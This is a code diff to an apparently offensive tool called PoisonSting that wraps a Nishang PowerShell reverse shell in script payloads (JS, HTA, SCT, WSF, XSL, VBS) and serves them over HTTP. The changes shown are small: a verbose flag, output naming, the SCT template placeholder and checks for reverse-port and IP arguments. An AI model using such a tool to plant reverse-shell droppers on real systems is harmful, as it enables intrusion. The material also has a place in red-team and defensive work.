@@ -78,7 +78,7 @@ class PoisonSting:
             "base64": False,
             "tfn-values": False,
             "safe": False,
-            "verbose": False
+            "verbose": True
         }
         outputdir = os.path.join(os.getcwd(), "Output")
         nishangRevScript = os.path.join(
@@ -217,7 +217,7 @@ class PoisonSting:
 
     def SavethePayload(self, payload):
         outputFileName=''.join(random.choice(
-            string.ascii_letters) for _ in range(6))+"."+self.payload_lang.lower()
+            string.ascii_letters) for _ in range(6))
         outputFilePath = os.path.join(os.getcwd(), "Output", outputFileName)
         with open(outputFilePath, 'w') as file:
             file.write(payload)
@@ -273,7 +273,7 @@ class PoisonSting:
     def SaveIntoSct(self, template_payload):
         print(BGREEN + "[+] Crafting the SCT Payload...")
         templatefile = self.read_file("templates/SctTemplate.sct")
-        payload = templatefile.replace("%PAYLOAD%", template_payload)
+        payload = templatefile.replace("%JSCRIPTPAYLOAD%", template_payload)
         return payload
 
     def generate_random_name(self):
@@ -372,7 +372,9 @@ def start_server(ip, port,payloadFileName):
         print(BWHITE + "\n[!] Server stopped by user.")
         Server.shutdown()
 
-
+def help():
+        print(BGREEN + f"For help, use: python {sys.argv[0]} --help")
+        exit()
 def main():
     # Create an ArgumentParser
     parser = argparse.ArgumentParser(description="PoisonSting Tool")
@@ -391,11 +393,20 @@ def main():
     # Parse the command-line arguments
     args = vars(parser.parse_args())
     if args.get("ScriptMaker", "").lower() == 'powershell':  # PowerShell script
+        if not args.get("ReversePort"):
+            print(BRED + f"Warning: Reverse port not provided. Please specify the reverse port to connect to.")
+            help()
+        if not args.get("IP"):
+            print(BRED + f"Warning: IP address not provided. Please specify the IP address to serve the payload.")
+            help()
+        if not args.get("Port"):
+            print(BRED + f"Warning: Port not provided. Please specify the port to serve the payload.")
+            help()
         if args.get("Language"):
             if args.get("Language").lower() not in ['js', 'hta', 'sct', 'wsf', 'xsl', 'vbs']:
                 print(
-                    "Warning: Invalid Payload Language. Please use one of the following: js, hta, sct, wsf, xsl, vbs")
-                print(f"For help, use: python {sys.argv[0]} --help")
+                    BRED + f"Warning: Invalid Payload Language. Please use one of the following: js, hta, sct, wsf, xsl, vbs")
+                help()
             else:
                 PoisonSting_instance = PoisonSting(args)
                 PoisonSting_instance.CraftPayload()
@@ -406,7 +417,7 @@ def main():
             if args.get("Language").lower() not in ['js', 'hta', 'sct', 'wsf', 'xsl']:
                 print(
                     "Warning: Invalid Payload Language. Please use one of the following: js, hta, sct, wsf, xsl")
-                print(f"For help, use: python {sys.argv[0]} --help")
+                help()
             else:
                 PoisonSting_instance = PoisonSting(args)
                 PoisonSting_instance.CraftPayload()
